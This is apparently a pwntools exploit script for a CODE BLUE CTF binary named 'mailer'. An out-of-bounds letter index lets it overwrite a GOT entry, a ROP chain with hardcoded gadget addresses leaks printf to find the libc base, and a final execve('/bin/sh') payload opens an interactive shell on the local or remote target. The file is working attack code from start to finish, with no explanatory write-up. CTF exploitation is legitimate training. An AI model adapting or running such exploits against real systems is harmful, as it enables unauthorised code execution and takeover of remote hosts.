from pwn import *

#context.log_level = "debug"
def add_letter(content):
    conn.sendlineafter("> ", "1")
    conn.sendlineafter("Input your contents: ", content)

def delete_letter(index):
    conn.sendlineafter("> ", "2")
    conn.sendlineafter("ID (0-4): ", str(index))

def post_letter(index, filter_type):
    conn.sendlineafter("> ", "3")
    conn.sendlineafter("ID (0-4): ", str(index))
    conn.sendlineafter("> ", str(filter_type))

def quit():
    conn.sendlineafter("> ", "4")

def exploit():
    add_letter(p32(0x0))
    #s reloc.setbuf_12 
    #[0x0804b00c]>
    post_letter(0, (0x0804b00c - 0x0804b048) // 4)
    payload = "\x41" * 0x10 + p32(0x1) + p32(0xf0)
    payload += open("gdb.txt").read()[:124 + 0x14 - len(payload)]
    payload += p32(0x0804b810)
    #0x08048530    1 6            sym.imp.puts
    payload += p32(0x08048530)
    #0x08048dab                 5d  pop ebp
    #0x08048dac                 c3  ret
    payload += p32(0x08048dab)
    #s reloc.printf_16 
    #[0x0804b010]>
    payload += p32(0x0804b010)
    #0x080486d9    9 105          sub.fread_6d9
    payload += p32(0x080486d9)
    #0x08048daa                 5f  pop edi
    #0x08048dab                 5d  pop ebp
    #0x08048dac                 c3  ret
    payload += p32(0x08048daa)
    payload += p32(0x0804b810)
    payload += p32(0x0804b80c)
    #0x08048cff                 c9  leave
    #0x08048d00                 c3  ret
    payload += p32(0x08048cff)
    payload += "B" * (0xf0 - len(payload))
    add_letter(payload)
    for i in range(0xc):
        post_letter(1, 0)
    #FOPEN = int(conn.recvuntil("\n")[:-1])
    ##0011d3c0 T fopen
    #LIBC = FOPEN - 0x00011d3c0
    #log.success("FOPEN :0x%x" % FOPEN)
    #log.success("LIBC :0x%x" % LIBC)
    quit()
    conn.recvuntil("Thank you for using our service :)\n")
    PRINTF = u32(conn.recv(4))
    log.success("PRINTF :0x%x" % PRINTF) 
    #00049020 T printf
    #local:00049670 T printf
    LIBC = PRINTF - 0x00049020
    log.success("LIBC :0x%x" % LIBC) 
    pause()
    #0003a940 W system
    #000af590 W execve
    #local:0003ada0 W system
    #local:000b07e0 W execve
    payload = p32(LIBC + 0xaf590)
    payload += p32(0x0804b824)
    payload += p32(0x0804b824)
    payload += p32(0x0804b82c)
    payload += p32(0x0)
    payload += "/bin/sh\x00"
    payload += p32(0x0804b810)
    conn.sendline(payload)
    conn.interactive()

if __name__ == "__main__":
    if len(sys.argv) > 1:
        HOST = "sms.tasks.ctf.codeblue.jp"
        PORT = 6029
        conn = remote(HOST, PORT)
    else:
        conn = process("./mailer", env={"LD_PRELOAD":"./libc.so.6"})
    exploit()
